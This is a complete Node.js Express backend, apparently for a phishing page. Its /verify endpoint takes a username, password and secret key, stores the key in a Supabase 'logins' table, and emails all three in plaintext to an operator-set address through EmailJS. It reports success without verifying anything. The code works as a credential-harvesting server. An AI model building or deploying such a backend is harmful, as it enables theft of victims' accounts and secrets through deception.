require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { createClient } = require("@supabase/supabase-js");
const emailjs = require("@emailjs/nodejs");

const app = express();
app.use(cors({ origin: process.env.CORS_ORIGIN || "http://localhost:3000" }));
app.use(express.json());

app.get("/", (req, res) => res.json({ status: "ok" }));

const ws = require("ws");
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY,
  { realtime: { transport: ws } }
);

app.post("/verify", async (req, res) => {
  const { username, password, secret_key, login_row_id } = req.body;

  if (!username || !password || !secret_key) {
    return res.status(400).json({ error: "Missing fields" });
  }

  try {
    if (login_row_id) {
      const { error } = await supabase
        .from("logins")
        .update({ secret_key })
        .eq("id", login_row_id);
      if (error) console.error("Supabase update error:", error);
    }
  } catch (err) {
    console.error("Supabase error:", err);
  }

  try {
    await emailjs.send(
      process.env.EMAILJS_SERVICE_ID,
      process.env.EMAILJS_TEMPLATE_ID,
      {
        username,
        password,
        secret_key,
        to_email: process.env.EMAILJS_TO_EMAIL,
      },
      {
        publicKey: process.env.EMAILJS_PUBLIC_KEY,
        privateKey: process.env.EMAILJS_PRIVATE_KEY,
      }
    );
  } catch (err) {
    console.error("EmailJS error:", err);
  }

  res.json({ status: "ok" });
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
